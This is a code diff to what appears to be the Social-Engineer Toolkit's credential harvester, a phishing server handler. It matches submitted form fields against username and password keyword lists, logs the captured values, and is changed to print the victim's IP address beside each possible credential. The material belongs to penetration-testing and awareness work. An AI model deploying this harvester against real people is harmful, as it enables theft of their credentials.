@@ -315,7 +315,7 @@ class SETHandler(BaseHTTPRequestHandler):
             filewrite3.close()
         filewrite2 = open("%s/src/logs/harvester.log" % os.getcwd(), "a")
         filewrite.write("\n\n")
-        print(bcolors.RED + "[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN)
+        # print(bcolors.RED + "[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN)
         for line in url:
             counter = 0
             line = line.rstrip()
@@ -323,7 +323,7 @@ class SETHandler(BaseHTTPRequestHandler):
             match = re.search(
                 "Email|email|login|logon|Logon|Login|user|username|Username|User", line)
             if match:
-                print(bcolors.RED + "POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
+                print(bcolors.RED + self.address_string() + " -- POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                 counter = 1
             match2 = re.search(
                 "pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass", line)
@@ -332,8 +332,9 @@ class SETHandler(BaseHTTPRequestHandler):
                 # not an exact science
                 log_password = check_config("HARVESTER_LOG_PASSWORDS=")
                 if log_password.lower() == "on":
-                    print(bcolors.RED + "POSSIBLE PASSWORD FIELD FOUND: " + line + "\r" + bcolors.GREEN)
+                    print(bcolors.RED + self.address_string() + " -- POSSIBLE PASSWORD FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                 else:
+                    print(bcolors.RED + self.address_string() + " -- POSSIBLE PASSWORD FIELD FOUND: *********" + "\r" + bcolors.GREEN)
                     line = ""
                 counter = 1
             filewrite.write(escape("PARAM: " + line + "\n"))
